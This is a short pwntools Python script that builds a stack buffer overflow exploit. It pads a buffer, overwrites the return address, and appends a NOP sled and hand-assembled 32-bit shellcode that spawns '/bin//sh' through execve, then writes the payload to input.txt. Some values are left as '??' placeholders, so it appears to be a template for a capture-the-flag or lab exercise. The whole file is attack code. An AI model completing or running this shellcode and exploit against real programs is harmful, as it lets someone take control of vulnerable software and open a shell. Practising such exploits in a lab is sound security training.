from pwn import *

# Number of bytes required to reach Return Address
BUF_SIZE = ??

# Manually build shellcode for exploit
sc = asm("""
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al,0x6
add    al,0x5
int    0x80
""")


# Address we want to return to
returnAddress = p32(0xffff????) # Use a NOP sled instead of GDB/Normal ret addr's

# NOP Sled!
nop_sled = b"\x90" * ??

log.info(f"Bytes until return address: {BUF_SIZE}")
log.info(f"Length of shellcode: {len(sc)}")
log.info(f"Return address: {returnAddress}")
log.info(f"Length of NOP sled: {len(nop_sled)}")

# Putting it all together...
exploit = b''
exploit += b"A" * BUF_SIZE # Fill buffer up to ret addr
exploit += returnAddress
exploit += nop_sled
exploit += sc

# Write exploit to a file as bytes (wb)
with open("input.txt", "wb") as fd:
    fd.write(exploit)
